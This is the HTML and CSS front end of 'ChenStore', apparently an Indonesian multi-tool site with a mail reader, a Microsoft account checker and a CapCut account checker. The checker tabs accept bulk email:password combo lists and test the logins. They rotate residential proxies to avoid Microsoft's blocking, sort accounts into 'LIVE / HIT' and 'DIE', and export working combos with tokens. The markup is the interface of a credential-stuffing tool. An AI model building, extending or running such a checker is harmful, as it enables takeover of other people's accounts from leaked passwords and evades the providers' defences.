      background: rgba(29, 18, 9, 0.88) !important;
      backdrop-filter: blur(12px) !important;
      -webkit-backdrop-filter: blur(12px) !important;
    }

    .modal-content {
      background: rgba(24, 17, 11, 0.95) !important;
      border: 1px solid var(--border-bronze) !important;
      border-radius: 14px !important;
      backdrop-filter: blur(16px) !important;
      -webkit-backdrop-filter: blur(16px) !important;
      box-shadow: 0 16px 40px rgba(0, 0, 0, 0.9) !important;
    }

    /* Modern Floating Toast Notification */
    #chenToastContainer {
      position: fixed;
      bottom: 24px;
      right: 24px;
      z-index: 999999;
      display: flex;
      flex-direction: column;
      gap: 10px;
      pointer-events: none;
    }

    /* Fixed Bottom-Left Subtle Transparent Watermark */
    .chen-powered-watermark {
      position: fixed;
      bottom: 12px;
      left: 14px;
      z-index: 999;
      display: flex;
      align-items: center;
      gap: 6px;
      padding: 4px 10px;
      background: rgba(18, 11, 6, 0.45);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      border: 1px solid rgba(120, 71, 28, 0.35);
      border-radius: 6px;
      font-size: 0.68rem;
      font-weight: 600;
      color: rgba(254, 240, 138, 0.65);
      letter-spacing: 0.5px;
      user-select: none;
      pointer-events: none;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
      transition: all 0.2s ease;
    }
    .chen-powered-watermark i {
      color: rgba(245, 158, 11, 0.8);
      font-size: 0.72rem;
    }
    .chen-powered-watermark .powered-brand {
      color: rgba(254, 243, 199, 0.9);
      font-weight: 700;
      letter-spacing: 0.6px;
    }

    .chen-toast {
      pointer-events: auto;
      background: linear-gradient(135deg, #2a180c 0%, #170d06 100%);
      border: 1px solid var(--gold-main);
      color: var(--text-main);
      padding: 10px 18px;
      border-radius: 10px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.7), 0 0 12px rgba(245, 158, 11, 0.25);
      font-size: 0.85rem;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 10px;
      animation: toastSlideIn 0.25s cubic-bezier(0.16, 1, 0.3, 1) forwards;
      transition: opacity 0.25s ease, transform 0.25s ease;
    }

    .chen-toast.hide {
      opacity: 0;
      transform: translateY(12px);
    }

    @keyframes toastSlideIn {
      from {
        opacity: 0;
        transform: translateY(20px) scale(0.95);
      }
      to {
        opacity: 1;
        transform: translateY(0) scale(1);
      }
    }

    /* 2FA 30s Countdown Visual Bar */
    .tfa-timer-container {
      width: 100%;
      height: 6px;
      background: rgba(255, 255, 255, 0.08);
      border-radius: 10px;
      overflow: hidden;
      margin-top: 8px;
      position: relative;
    }

    .tfa-timer-bar {
      height: 100%;
      width: 100%;
      background: linear-gradient(90deg, #22c55e 0%, #f59e0b 70%, #ef4444 100%);
      border-radius: 10px;
      transition: width 1s linear;
    }

    /* CapCut Progress Bar */
    .cc-progress-container {
      display: none;
      margin-top: 12px;
      background: #110a06;
      border: 1px solid var(--border-bronze);
      border-radius: 10px;
      padding: 12px;
    }

    .cc-progress-bar {
      height: 8px;
      border-radius: 6px;
      background: linear-gradient(90deg, #d97706, #f59e0b);
      box-shadow: 0 0 10px var(--gold-glow);
      transition: width 0.2s ease;
    }

    @media (max-width: 768px) {
      #chenToastContainer {
        top: 62px;
        bottom: auto;
        right: 16px;
        left: 16px;
        align-items: center;
      }
      .chen-toast {
        max-width: fit-content;
        padding: 7px 16px;
        border-radius: 25px;
        font-size: 0.78rem;
        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.85), 0 0 10px rgba(245, 158, 11, 0.3);
        animation: toastSlideDown 0.25s cubic-bezier(0.16, 1, 0.3, 1) forwards;
      }
    }

    @keyframes toastSlideDown {
      from {
        opacity: 0;
        transform: translateY(-15px) scale(0.96);
      }
      to {
        opacity: 1;
        transform: translateY(0) scale(1);
      }
    }
    
    /* Language Selector Custom Styles */
    .lang-wrapper {
      position: relative;
      display: inline-block;
      flex-shrink: 0;
    }

    .lang-dropdown-menu {
      display: none;
      position: absolute;
      top: calc(100% + 6px);
      right: 0;
      background: #18110b;
      border: 1px solid #78471c;
      border-radius: 8px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.85);
      min-width: 180px;
      z-index: 99999;
      padding: 6px 0;
      margin: 0;
      list-style: none;
    }

    .lang-dropdown-menu.show {
      display: block !important;
    }

    .lang-dropdown-item {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 8px 14px;
      color: #fef08a;
      text-decoration: none;
      font-size: 0.84rem;
      font-weight: 500;
      cursor: pointer;
      user-select: none;
      transition: background 0.15s ease, color 0.15s ease;
    }

    .lang-dropdown-item:hover, .lang-dropdown-item:active {
      background: rgba(217, 119, 6, 0.25);
      color: #ffffff;
    }

    .lang-dropdown-item.active {
      background: rgba(217, 119, 6, 0.4);
      color: #fbbf24;
      font-weight: 700;
    }

    /* Responsive Design for Mobile & Tablet */
    @media (max-width: 991.98px) {
      .top-navbar {
        display: grid !important;
        grid-template-columns: 1fr auto !important;
        grid-template-areas:
          "brand lang"
          "tabmenu tabmenu" !important;
        padding: 0.5rem 0.75rem !important;
        gap: 0.45rem 0.5rem !important;
      }
      .brand-container {
        grid-area: brand;
        min-width: 0;
      }
      .brand-title {
        font-size: 1.15rem;
      }
      .brand-sub {
        font-size: 0.56rem;
      }
      .navbar-right {
        display: contents !important;
      }
      .navbar-tabs-container {
        display: none !important;
      }
      .lang-wrapper {
        grid-area: lang;
        align-self: center;
        justify-self: end;
      }
      .mobile-tab-dropdown {
        grid-area: tabmenu;
        display: block !important;
        width: 100%;
        position: relative;
      }
      .mobile-tab-dropdown > button {
        width: 100%;
        justify-content: space-between;
        padding: 0.45rem 0.85rem;
        background: rgba(255, 255, 255, 0.03);
        border: 1px solid var(--border-bronze);
      }
      .mobile-tab-menu {
        width: 100%;
        left: 0;
        right: 0;
        min-width: 100%;
      }
      .capcut-container {
        padding: 0.75rem 0.5rem;
      }
      .trackmail-container {
        height: calc(100vh - 105px);
      }
      .tm-sidebar, .tm-messages-col, .tm-reader-col {
        width: 100% !important;
        min-width: 100% !important;
        display: none;
      }
      .tm-view-accounts .tm-sidebar { display: flex !important; }
      .tm-view-inbox .tm-messages-col { display: flex !important; }
      .tm-view-reader .tm-reader-col { display: flex !important; }

      /* Mobile inputs: avoid iOS zoom on focus */
      .form-control-theme, input, select, textarea {
        font-size: 16px !important;
      }
    }
  </style>
</head>
<body>

  <!-- Top Navbar -->
  <div class="top-navbar">
    <div class="brand-container">
      <img src="/logo.png" data-fallback="data:image/png;base64,{{ favicon_b64 }}" alt="ChenStore" class="brand-logo-img" onerror="if(this.dataset.fallback && this.src !== this.dataset.fallback){this.src=this.dataset.fallback;}else{this.style.display='none';}">
      <div>
        <div class="brand-title">ChenStore</div>
        <div class="brand-sub" data-i18n="brand_sub">MULTI TOOLS • LAYANAN SOSMED</div>
      </div>
    </div>
    
    <div class="navbar-right">
      <!-- Desktop Navigation Tabs (>= 992px) -->
      <div class="navbar-tabs-container">
        <div class="nav-tabs-custom" id="mainTabs">
          <button type="button" class="nav-tab-btn active" id="btn-tab-mail" onclick="switchTab('mail')">
            <i class="fa-solid fa-inbox me-1.5 text-warning"></i><span data-i18n="tab_mail">Mail Reader</span>
          </button>
          <button type="button" class="nav-tab-btn" id="btn-tab-hotmail" onclick="switchTab('hotmail')">
            <i class="fa-brands fa-microsoft me-1.5 text-warning"></i><span data-i18n="tab_hotmail">MS Mail Checker</span>
          </button>
          <button type="button" class="nav-tab-btn" id="btn-tab-capcut" onclick="switchTab('capcut')">
            <i class="fa-solid fa-film me-1.5 text-warning"></i><span data-i18n="tab_capcut">CapCut Checker</span>
          </button>
          <button type="button" class="nav-tab-btn" id="btn-tab-2fa" onclick="switchTab('2fa')">
            <i class="fa-solid fa-key me-1.5 text-warning"></i><span data-i18n="tab_2fa">2FA Generator</span>
          </button>
          <button type="button" class="nav-tab-btn" id="btn-tab-proxy" onclick="switchTab('proxy')">
            <i class="fa-solid fa-server me-1.5 text-warning"></i><span data-i18n="tab_proxy">Proxy Checker</span>
          </button>
        </div>
      </div>

      <!-- Mobile & Tablet Menu Dropdown (< 992px) -->
      <div class="mobile-tab-dropdown" id="mobileTabDropdownWrapper">
        <button class="btn btn-sm btn-outline-gold px-3 py-1.5 fw-bold d-flex align-items-center justify-content-between" type="button" id="mobileTabDropdownBtn" onclick="toggleMobileTabMenu(event)" style="font-size: 0.82rem; border-radius: 8px;">
          <div class="d-flex align-items-center gap-2">
            <i class="fa-solid fa-bars text-warning fs-6"></i>
            <span data-i18n="nav_menu" class="fw-bold text-uppercase" style="letter-spacing: 0.5px;">Menu</span>
          </div>
          <i class="fa-solid fa-chevron-down fa-xs opacity-75"></i>
        </button>
        <div class="mobile-tab-menu" id="mobileTabMenuList">
          <div class="mobile-tab-item active" onclick="selectMobileTab('mail', event)">
            <i class="fa-solid fa-inbox text-warning me-2"></i><span data-i18n="tab_mail">Mail Reader</span>
          </div>
          <div class="mobile-tab-item" onclick="selectMobileTab('hotmail', event)">
            <i class="fa-brands fa-microsoft text-warning me-2"></i><span data-i18n="tab_hotmail">MS Mail Checker</span>
          </div>
          <div class="mobile-tab-item" onclick="selectMobileTab('capcut', event)">
            <i class="fa-solid fa-film text-warning me-2"></i><span data-i18n="tab_capcut">CapCut Checker</span>
          </div>
          <div class="mobile-tab-item" onclick="selectMobileTab('2fa', event)">
            <i class="fa-solid fa-key text-warning me-2"></i><span data-i18n="tab_2fa">2FA Generator</span>
          </div>
          <div class="mobile-tab-item" onclick="selectMobileTab('proxy', event)">
            <i class="fa-solid fa-server text-warning me-2"></i><span data-i18n="tab_proxy">Proxy Checker</span>
          </div>
        </div>
      </div>

      <!-- Single Unified Language Selector Dropdown -->
      <div class="lang-wrapper" id="langSelectorWrapper">
        <button class="btn btn-sm btn-outline-gold px-2.5 py-1 fw-bold d-flex align-items-center gap-1.5" type="button" id="langDropdownBtn" onclick="toggleLangMenu(event)" style="font-size: 0.82rem; border-radius: 8px;">
          <span class="currentLangFlag">🇮🇩</span> <span class="currentLangCode">ID</span>
          <i class="fa-solid fa-chevron-down fa-xs ms-1 opacity-75"></i>
        </button>
        <div class="lang-dropdown-menu" id="langDropdownList">
          <div class="lang-dropdown-item" onclick="selectAppLanguage('id', event)"><span class="fs-6">🇮🇩</span> <span>Bahasa Indonesia</span></div>
          <div class="lang-dropdown-item" onclick="selectAppLanguage('en', event)"><span class="fs-6">🇬🇧</span> <span>English</span></div>
          <div class="lang-dropdown-item" onclick="selectAppLanguage('vi', event)"><span class="fs-6">🇻🇳</span> <span>Tiếng Việt</span></div>
          <div class="lang-dropdown-item" onclick="selectAppLanguage('zh', event)"><span class="fs-6">🇨🇳</span> <span>简体中文</span></div>
          <div class="lang-dropdown-item" onclick="selectAppLanguage('ru', event)"><span class="fs-6">🇷🇺</span> <span>Русский</span></div>
          <div class="lang-dropdown-item" onclick="selectAppLanguage('es', event)"><span class="fs-6">🇪🇸</span> <span>Español</span></div>
          <div class="lang-dropdown-item" onclick="selectAppLanguage('pt', event)"><span class="fs-6">🇧🇷</span> <span>Português</span></div>
        </div>
      </div>
    </div>
  </div>

  <div class="main-tab-content">
    
    <!-- TAB 1: MAIL CHECKER (TRACKMAIL) -->
    <div id="tab-mail" class="tab-pane-custom active">
      <div id="trackmailContainer" class="trackmail-container tm-view-accounts">
        
        <!-- Column 1: Accounts Sidebar -->
        <div class="tm-sidebar">
          <div class="tm-sidebar-header">
            <span class="small fw-bold text-uppercase text-warning" style="letter-spacing: 0.5px;">
              <i class="fa-solid fa-users-viewfinder me-1"></i> <span data-i18n="tm_accounts_title">Accounts</span> (<span id="tmAccountCount">0</span>)
            </span>
            <div class="d-flex gap-2">
              <button class="btn btn-sm btn-outline-secondary p-1" data-i18n-title="tm_clear_all_title" title="Clear All" onclick="clearAllOutlookAccounts()">
                <i class="fa-solid fa-trash-can fa-xs text-danger"></i>
              </button>
            </div>
          </div>

          <!-- Quick Search & Upload Bar -->
          <div class="p-2 border-bottom border-secondary" style="background: #110a06;">
            <div class="input-group input-group-sm mb-2">
              <span class="input-group-text bg-dark border-secondary text-secondary p-1 px-2"><i class="fa-solid fa-magnifying-glass fa-xs"></i></span>
              <input type="text" id="tmAccountSearch" class="form-control form-control-sm form-control-theme" data-i18n-ph="tm_search_acc_ph" placeholder="Cari email akun..." oninput="renderAccountsList()" onkeydown="handleAccountSearchKeydown(event)">
            </div>
            <div class="d-flex gap-1 mb-1">
              <input type="file" id="tmDirectTxtFile" accept=".txt,.csv" style="display:none" onchange="handleTxtFileUpload(event)">
              <button class="btn btn-sm btn-outline-gold flex-grow-1 py-1" style="font-size: 0.74rem;" onclick="document.getElementById('tmDirectTxtFile').click()" data-i18n-title="tm_upload_txt_title" title="Upload File .TXT (Bulk Auto-read)">
                <i class="fa-solid fa-file-arrow-up me-1"></i><span data-i18n="tm_upload_txt">Upload .TXT</span>
              </button>
              <button class="btn btn-sm btn-gold py-1 px-3" style="font-size: 0.74rem;" data-bs-toggle="modal" data-bs-target="#addAccountModal" data-i18n-title="tm_add_btn_title" title="Tambah Akun Manual">
                <i class="fa-solid fa-plus me-1"></i><span data-i18n="tm_add_btn">Add</span>
              </button>
            </div>
            <div class="d-flex justify-content-between align-items-center mt-1 px-1">
              <span id="tmAccountModeStatus" class="text-secondary small" style="font-size: 0.7rem;" data-i18n="tm_mode_search">Mode: Cari Email</span>
              <button id="btnToggleShowAll" class="btn btn-sm btn-link p-0 text-warning text-decoration-none small" style="font-size: 0.72rem;" onclick="toggleShowAllAccounts()">
                <i class="fa-solid fa-eye me-1"></i><span data-i18n="tm_show_all">Tampilkan Semua</span>
              </button>
            </div>
          </div>

          <!-- Accounts List Container -->
          <div class="tm-accounts-list" id="tmAccountsContainer">
            <div class="text-center text-muted py-5 small" data-i18n="tm_empty_acc_msg">
              Belum ada akun.<br>Upload file <b>.TXT</b> atau klik <b>Add</b>.
            </div>
          </div>
        </div>

        <!-- Column 2: Inbox Messages -->
        <div class="tm-messages-col">
          <div class="tm-messages-header">
            <div class="d-flex align-items-center gap-2">
              <button class="btn btn-sm btn-outline-warning py-0 px-2 d-lg-none" onclick="setMailView('accounts')" title="Back to Accounts">
                <i class="fa-solid fa-chevron-left me-1"></i><span data-i18n="tm_btn_accounts">Akun</span>
              </button>
              <span class="fw-bold small text-uppercase text-warning" id="tmInboxTitle">
                <i class="fa-regular fa-folder-open me-1"></i> <span data-i18n="tm_inbox_title">INBOX</span> (0)
              </span>
            </div>
            <button class="btn btn-sm btn-outline-gold py-0 px-2" onclick="refreshCurrentInbox()" title="Refresh Inbox">
              <i class="fa-solid fa-rotate-right fa-xs"></i>
            </button>
          </div>

          <!-- Platform Filter Chips & Search -->
          <div class="p-2 border-bottom border-secondary" style="background: #110a06;">
            <div class="input-group input-group-sm mb-2">
              <span class="input-group-text bg-dark border-secondary text-secondary p-1 px-2"><i class="fa-solid fa-filter fa-xs"></i></span>
              <input type="text" id="tmMessageSearch" class="form-control form-control-sm form-control-theme" data-i18n-ph="tm_filter_msg_ph" placeholder="Filter pengirim / subjek..." oninput="renderCurrentMessages()">
            </div>
            <div class="tm-platform-chips">
              <button class="tm-chip-btn active" id="chip-plat-all" onclick="setPlatformFilter('all')">All</button>
              <button class="tm-chip-btn" id="chip-plat-capcut" onclick="setPlatformFilter('capcut')"><i class="fa-solid fa-film text-warning me-1"></i>CapCut</button>
              <button class="tm-chip-btn" id="chip-plat-netflix" onclick="setPlatformFilter('netflix')"><i class="fa-solid fa-tv text-danger me-1"></i>Netflix</button>
              <button class="tm-chip-btn" id="chip-plat-steam" onclick="setPlatformFilter('steam')"><i class="fa-brands fa-steam text-info me-1"></i>Steam</button>
              <button class="tm-chip-btn" id="chip-plat-epic" onclick="setPlatformFilter('epic')"><i class="fa-solid fa-gamepad text-light me-1"></i>Epic</button>
              <button class="tm-chip-btn" id="chip-plat-tiktok" onclick="setPlatformFilter('tiktok')"><i class="fa-brands fa-tiktok text-light me-1"></i>TikTok</button>
              <button class="tm-chip-btn" id="chip-plat-telegram" onclick="setPlatformFilter('telegram')"><i class="fa-brands fa-telegram text-info me-1"></i>Telegram</button>
              <button class="tm-chip-btn" id="chip-plat-discord" onclick="setPlatformFilter('discord')"><i class="fa-brands fa-discord text-primary me-1"></i>Discord</button>
              <button class="tm-chip-btn" id="chip-plat-microsoft" onclick="setPlatformFilter('microsoft')"><i class="fa-brands fa-microsoft text-warning me-1"></i>Microsoft</button>
            </div>
          </div>

          <!-- Message Items List -->
          <div class="tm-messages-list" id="tmMessagesContainer">
            <div class="text-center text-muted py-5 small" data-i18n="tm_empty_inbox_select">
              Pilih akun di sebelah kiri untuk melihat pesan inbox.
            </div>
          </div>
        </div>

        <!-- Column 3: Full Email Reader -->
        <div class="tm-reader-col">
          <div class="tm-reader-topbar">
            <div class="d-flex align-items-center gap-2 overflow-hidden">
              <button class="btn btn-sm btn-outline-warning py-0 px-2 d-lg-none flex-shrink-0" onclick="setMailView('inbox')" title="Back to Inbox">
                <i class="fa-solid fa-chevron-left me-1"></i>Inbox
              </button>
              <span class="fw-semibold text-truncate text-warning" id="tmActiveEmailLabel" style="max-width: 240px;" data-i18n="tm_active_email_placeholder">Pilih Akun</span>
              <span id="tmConnectionBadge" class="badge bg-dark border border-secondary text-secondary px-2 py-1 flex-shrink-0" data-i18n="tm_badge_standby">
                ● Standby
              </span>
            </div>
            <div class="d-flex gap-2 flex-shrink-0">
              <button class="btn btn-sm btn-outline-gold" onclick="copyCurrentEmail()" title="Copy Email">
                <i class="fa-regular fa-copy me-1"></i> <span data-i18n="tm_btn_copy">Copy</span>
              </button>
              <button class="btn btn-sm btn-outline-gold" onclick="refreshCurrentInbox()" title="Refresh">
                <i class="fa-solid fa-arrows-rotate"></i>
              </button>
            </div>
          </div>

          <div class="tm-reader-content" id="tmReaderContent">
            <div class="text-center text-muted my-auto">
              <i class="fa-regular fa-envelope-open fa-3x mb-3 text-warning"></i>
              <h5 class="text-light" data-i18n="tm_no_email_selected">Belum ada email yang dipilih</h5>
              <p class="small text-secondary" data-i18n="tm_click_inbox_hint">Klik salah satu email dari daftar inbox untuk membaca isi surat.</p>
            </div>
          </div>
        </div>

      </div>
    </div>

    <!-- TAB: HOTMAIL / OUTLOOK (EMAIL:PASS) CHECKER -->
    <div id="tab-hotmail" class="tab-pane-custom">
      <div class="capcut-container">
        <div class="row g-4">
          
          <div class="col-lg-5">
            <div class="card card-theme p-4 shadow-sm">
              <div class="d-flex justify-content-between align-items-center mb-2">
                <h5 class="fw-bold mb-0 text-warning"><i class="fa-brands fa-microsoft me-2"></i><span data-i18n="hm_card_title">MS Mail Checker</span></h5>
                <span class="badge bg-dark border border-warning text-warning px-2 py-1 small">EMAIL:PASS</span>
              </div>
              <p class="text-secondary small mb-3" data-i18n="hm_desc">
                Cek validitas login akun Microsoft (Hotmail / Outlook / Live / MSN) format <code>email:password</code> atau <code>email|password</code> & deteksi Negara/Lokasi.
              </p>
              
              <div class="mb-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                  <label class="form-label text-secondary small fw-semibold mb-0" data-i18n="hm_acc_label">DAFTAR AKUN (email:pass / email|pass)</label>
                  <div class="d-flex gap-2">
                    <button class="btn btn-sm btn-link text-warning p-0 text-decoration-none small" onclick="loadSampleHotmail()">Sample</button>
                    <button class="btn btn-sm btn-link text-secondary p-0 text-decoration-none small" onclick="clearHotmailInput()">Clear</button>
                  </div>
                </div>
                <textarea id="hotmailAccountsInput" class="form-control form-control-theme" rows="7" data-i18n-ph="hm_acc_ph" placeholder="user1@hotmail.com:password123&#10;user2@outlook.com|password456" oninput="updateHotmailCount()"></textarea>
                <div class="d-flex justify-content-between mt-1">
                  <small id="hotmailAccountCount" class="text-muted">Total: 0 akun</small>
                </div>
              </div>

              <!-- Proxy Settings for Hotmail -->
              <div class="mb-3 p-2 bg-dark rounded border border-secondary">
                <div class="form-check form-switch mb-2">
                  <input class="form-check-input" type="checkbox" id="useHotmailProxyToggle" onchange="toggleHotmailProxyField()">
                  <label class="form-check-label small fw-semibold text-warning" for="useHotmailProxyToggle" data-i18n="hm_use_proxy_label">Gunakan Proxy (Disarankan)</label>
                </div>
                <div id="hotmailProxyFieldContainer" style="display: none;">
                  <div class="d-flex justify-content-between align-items-center mb-1">
                    <label class="form-label text-secondary small fw-semibold mb-0" data-i18n="hm_proxy_label">RESIDENTIAL PROXY (HTTP/SOCKS5)</label>
                    <div class="d-flex gap-2 align-items-center">
                      <label for="hotmailProxyFileInput" class="btn btn-sm btn-outline-warning py-0 px-1" style="font-size: 0.72rem; cursor: pointer;">
                        <i class="fa-solid fa-file-arrow-up me-1"></i>Upload .txt
                      </label>
                      <input type="file" id="hotmailProxyFileInput" accept=".txt" style="display: none;" onchange="handleHotmailProxyFileUpload(event)">
                      <button class="btn btn-sm btn-link text-secondary p-0 text-decoration-none" style="font-size: 0.72rem;" onclick="document.getElementById('hotmailProxyInput').value=''; updateHotmailProxyCount();">Clear</button>
                    </div>
                  </div>
                  <textarea id="hotmailProxyInput" class="form-control form-control-sm form-control-theme mb-1 font-monospace" rows="2" placeholder="http://username:password@gw.dataimpulse.com:823 atau list proxy (1 per baris)" oninput="updateHotmailProxyCount()">{{ default_proxy }}</textarea>
                  <div class="d-flex justify-content-between align-items-center mb-2">
                    <small id="hotmailProxyCountLabel" class="text-muted" style="font-size: 0.72rem;">Wajib Residential Proxy (DataImpulse, dll) agar tidak diblokir Microsoft.</small>
                    <small class="text-secondary" style="font-size: 0.7rem;">Rotasi Otomatis</small>
                  </div>
                  
                  <div class="d-flex align-items-center justify-content-between p-2 rounded bg-black border border-secondary">
                    <div class="d-flex align-items-center gap-1.5">
                      <i class="fa-solid fa-chart-pie text-info small"></i>
                      <span class="small text-secondary fw-semibold" style="font-size: 0.75rem;">KUOTA PROXY:</span>
                    </div>
                    <div class="d-flex align-items-center gap-2">
                      <span id="hotmailProxyUsageBadge" class="badge bg-dark border border-info text-info font-monospace" style="font-size: 0.78rem;">0 B</span>
                      <button class="btn btn-sm btn-link text-secondary p-0 text-decoration-none" onclick="resetHotmailProxyUsage()" title="Reset Pemakaian">
                        <i class="fa-solid fa-rotate-left fa-xs text-warning"></i>
                      </button>
                    </div>
                  </div>
                </div>
              </div>

              <div class="row g-2 mb-3">
                <div class="col-6">
                  <label class="form-label text-secondary small fw-semibold" data-i18n="hm_threads_label">THREADS</label>
                  <input type="number" id="hotmailWorkersInput" class="form-control form-control-theme" value="3" min="1" max="6">
                </div>
                <div class="col-6">
                  <label class="form-label text-secondary small fw-semibold" data-i18n="hm_timeout_label">TIMEOUT (s)</label>
                  <input type="number" id="hotmailTimeoutInput" class="form-control form-control-theme" value="15" min="5" max="45">
                </div>
              </div>

              <div class="d-flex gap-2">
                <button id="btnStartHotmail" class="btn btn-gold flex-grow-1 py-2" onclick="startHotmailChecking()">
                  <i class="fa-solid fa-play me-2"></i><span data-i18n="hm_btn_start">Mulai Check MS Mail</span>
                </button>
                <button id="btnStopHotmail" class="btn btn-outline-secondary py-2" onclick="stopHotmailChecking()" disabled>
                  <i class="fa-solid fa-stop me-2"></i><span data-i18n="hm_btn_stop">Stop</span>
                </button>
              </div>

              <!-- Animated Live Progress Bar -->
              <div class="cc-progress-container" id="hotmailProgressBox" style="display: none; margin-top: 12px; background: #110a06; border: 1px solid var(--border-bronze); border-radius: 10px; padding: 12px;">
                <div class="d-flex justify-content-between align-items-center mb-1 small">
                  <span class="text-warning fw-semibold"><i class="fa-solid fa-spinner fa-spin me-1"></i>Checking...</span>
                  <span id="hotmailProgressText" class="font-monospace text-light">0/0 (0%)</span>
                </div>
                <div class="progress bg-dark" style="height: 8px; border: 1px solid var(--border-bronze); border-radius: 6px; overflow: hidden;">
                  <div class="cc-progress-bar" id="hotmailProgressBar" style="width: 0%; height: 8px; border-radius: 6px; background: linear-gradient(90deg, #10b981, #059669); box-shadow: 0 0 10px rgba(16, 185, 129, 0.35); transition: width 0.2s ease;"></div>
                </div>
              </div>
            </div>
          </div>

          <div class="col-lg-7">
            <div class="card card-theme p-4 shadow-sm">
              <div class="d-flex justify-content-between align-items-center mb-3 flex-wrap gap-2">
                <h5 class="fw-bold mb-0 text-warning"><i class="fa-solid fa-square-poll-vertical me-2"></i><span data-i18n="hm_results_title">Hasil Pengecekan MS Mail</span></h5>
                <div class="d-flex gap-2 flex-wrap">
                  <button class="btn btn-sm btn-outline-warning fw-semibold" onclick="openDeviceAuthModal()" title="Generator Token Resmi Microsoft Graph">
                    <i class="fa-brands fa-microsoft me-1"></i><span>Get Token Resmi</span>
                  </button>
                  <button class="btn btn-sm btn-gold fw-bold shadow-sm" onclick="transferLiveToMailReader()" title="Langsung buka semua akun LIVE di tab Mail Reader">
                    <i class="fa-solid fa-bolt me-1"></i><span>Kirim ke Mail Reader</span>
                  </button>
                  <button class="btn btn-sm btn-outline-gold" onclick="downloadHotmailLive('token')" title="Download format Email|Pass|Token|Client_ID">
                    <i class="fa-solid fa-key me-1"></i><span>Save + Token (.txt)</span>
                  </button>
                  <button class="btn btn-sm btn-outline-secondary text-light" onclick="downloadHotmailLive('combo')" title="Download format Email:Pass">
                    <i class="fa-solid fa-download me-1"></i><span>Save Combo</span>
                  </button>
                </div>
              </div>

              <!-- LIVE Accounts Result -->
              <div class="mb-3">
                <div class="d-flex justify-content-between align-items-center mb-1 flex-wrap gap-1">
                  <span class="fw-bold text-success">
                    <i class="fa-solid fa-circle-check me-1"></i><span data-i18n="hm_live_title">LIVE / HIT</span> 
                    <span id="hotmailLiveCount" class="badge bg-success badge-counter ms-1">0</span>
                  </span>
                  <div class="btn-group btn-group-sm">
                    <button class="btn btn-sm btn-outline-warning" onclick="copyHotmailLive('token')" title="Salin format email|pass|token|client_id"><i class="fa-solid fa-key me-1"></i>Copy Token</button>
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyHotmailLive('combo')" title="Salin email:pass"><i class="fa-regular fa-copy me-1"></i>Copy Combo</button>
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyHotmailLive('full')" title="Salin email:pass | Negara"><i class="fa-solid fa-globe me-1"></i>Copy Full</button>
                  </div>
                </div>

                <!-- Live Format Switcher Toolbar -->
                <div class="d-flex align-items-center gap-2 mb-2 p-1.5 rounded bg-black border border-secondary" style="font-size: 0.76rem;">
                  <span class="text-warning fw-semibold ps-1 flex-shrink-0"><i class="fa-solid fa-sliders me-1"></i>Format Output:</span>
                  <div class="btn-group btn-group-sm flex-grow-1" role="group">
                    <button type="button" class="btn btn-xs btn-outline-warning active fw-bold py-1" id="btnFmtToken" onclick="setHotmailDisplayFormat('token')">
                      <i class="fa-solid fa-key me-1"></i>Token (Mail Reader) <span class="badge bg-dark border border-warning text-warning ms-1" style="font-size:0.62rem; font-weight:normal;">(Dalam Pengembangan)</span>
                    </button>
                    <button type="button" class="btn btn-xs btn-outline-secondary text-light fw-bold py-1" id="btnFmtInfo" onclick="setHotmailDisplayFormat('info')">
                      <i class="fa-solid fa-globe me-1"></i>Info Negara
                    </button>
                    <button type="button" class="btn btn-xs btn-outline-secondary text-light fw-bold py-1" id="btnFmtSimple" onclick="setHotmailDisplayFormat('simple')">
                      <i class="fa-solid fa-user-lock me-1"></i>Email:Pass
                    </button>
                  </div>
                </div>

                <textarea id="hotmailLiveResult" class="form-control form-control-theme border-success font-monospace" rows="6" readonly data-i18n-ph="hm_live_ph" placeholder="Akun LIVE akan muncul di sini... (Catatan: Fitur Auto-Token Mail Reader masih dalam tahap pengembangan)"></textarea>
              </div>

              <!-- DIE / ERROR Accounts Result -->
              <div>
                <div class="d-flex justify-content-between align-items-center mb-1">
                  <span class="fw-bold text-danger">
                    <i class="fa-solid fa-circle-xmark me-1"></i><span data-i18n="hm_die_title">DIE / WRONG PASS</span>
                    <span id="hotmailDieCount" class="badge bg-danger badge-counter ms-1">0</span>
                  </span>
                  <div class="btn-group btn-group-sm">
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyField('hotmailDieResult')" data-i18n="hm_btn_copy">Copy</button>
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="downloadField('hotmailDieResult', 'hotmail_die.txt')" data-i18n="hm_btn_save">Save</button>
                  </div>
                </div>
                <textarea id="hotmailDieResult" class="form-control form-control-theme border-danger font-monospace" rows="5" readonly data-i18n-ph="hm_die_ph" placeholder="Akun DIE (salah password / tidak ada) akan muncul di sini..."></textarea>
              </div>

            </div>
          </div>

        </div>
      </div>
    </div>

    <!-- TAB 2: CAPCUT CHECKER -->
    <div id="tab-capcut" class="tab-pane-custom">
      <div class="capcut-container">
        <div class="row g-4">
          
          <div class="col-lg-5">
            <div class="card card-theme p-4 shadow-sm">
              <h5 class="fw-bold mb-3 text-warning"><i class="fa-solid fa-film me-2"></i><span data-i18n="cc_card_title">Input Akun CapCut</span></h5>
              
              <div class="mb-3">
                <label class="form-label text-secondary small fw-semibold" data-i18n="cc_acc_label">DAFTAR AKUN (email:pass, email|pass, dll)</label>
                <textarea id="ccAccountsInput" class="form-control form-control-theme" rows="7" data-i18n-ph="cc_acc_ph" placeholder="user1@example.com:password123&#10;user2@example.com|password456"></textarea>
                <div class="d-flex justify-content-between mt-1">
                  <small id="ccAccountCount" class="text-muted">Total: 0 akun</small>
                  <button class="btn btn-sm btn-link text-decoration-none p-0 text-danger" onclick="document.getElementById('ccAccountsInput').value=''; updateCapcutCount();">Clear</button>
                </div>
              </div>

              <div class="mb-3">
                <label class="form-label text-secondary small fw-semibold mb-1" data-i18n="cc_proxy_label">RESIDENTIAL PROXY URL (Wajib)</label>
                <input type="text" id="ccProxyInput" class="form-control form-control-theme mb-1" placeholder="http://user-session-{sess}:pass@gate.provider.com:7000" value="{{ default_proxy }}">
